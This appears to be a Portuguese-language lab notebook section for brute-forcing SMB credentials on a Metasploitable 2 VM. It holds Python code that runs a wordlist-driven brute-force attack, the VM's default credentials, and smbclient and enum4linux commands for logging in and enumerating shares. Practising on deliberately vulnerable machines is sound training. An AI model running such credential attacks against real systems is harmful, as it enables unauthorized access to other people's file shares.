## 4️⃣ BRUTE FORCE SMB - Força Bruta contra Samba

---

### 🎯 Objetivo

Executar ataque de força bruta contra SMB (Samba) para descobrir credenciais de compartilhamento.

---

## 1. Setup

```python
import sys
import os
import json
from pathlib import Path
from datetime import datetime
from dotenv import load_dotenv

scripts_dir = Path("../scripts/python")
sys.path.insert(0, str(scripts_dir.absolute()))

from brute_force import BruteForceAttack

load_dotenv(Path("../.env"))

TARGET_IP = os.getenv("TARGET_IP", "192.168.56.101")
RESULTS_DIR = Path("../results")

print(f"✅ Setup concluído")
print(f"   Target: {TARGET_IP}:445 (SMB)")
```

## 2. Enumeração SMB

```python
print(f"\n🔍 Enumeração SMB\n")

print("Shares esperados em Metasploitable 2:")
expected_shares = {
    "IPC$": "Pipes interprocess",
    "ADMIN$": "Compartilhamento administrativo",
    "C$": "Raiz C: (requer admin)",
    "print$": "Drivers de impressora",
}

for share, desc in expected_shares.items():
    print(f"  • {share:15} - {desc}")

print("\nUsuários esperados:")
users = ["root", "admin", "msfadmin", "guest"]
for user in users:
    print(f"  • {user}")
```

## 3. Brute Force SMB

```python
print(f"\n🔓 Iniciando Brute Force SMB\n")
print(f"⏳ Processando...\n")

try:
    attack = BruteForceAttack(TARGET_IP, output_dir=RESULTS_DIR)
    
    username_file = str(Path("../wordlists/smb_users.txt"))
    password_file = str(Path("../wordlists/common_passwords.txt"))
    
    result = attack.smb_brute_force(username_file, password_file, threads=4)
    
    print("\n" + "="*60)
    print("RESULTADO DO ATAQUE SMB")
    print("="*60)
    print(json.dumps(result, indent=2))
    
except Exception as e:
    print(f"❌ Erro: {e}")
```

## 4. Validação e Acesso

```python
print("\n✅ CREDENCIAIS PADRÃO METASPLOITABLE 2\n")

default_creds = {
    "root": "root",
    "msfadmin": "msfadmin",
}

print("Credenciais conhecidas:")
for user, pwd in default_creds.items():
    print(f"  • {user}:{pwd}")

print("\nComandos para validar (Linux):")
print("  # Listar shares")
print(f"  smbclient -L {TARGET_IP} -U root%root")
print(f"\n  # Conectar a share")
print(f"  smbclient //{TARGET_IP}/print$ -U root%root")
print(f"\n  # Enum4linux (enumeração completa)")
print(f"  enum4linux {TARGET_IP}")
```
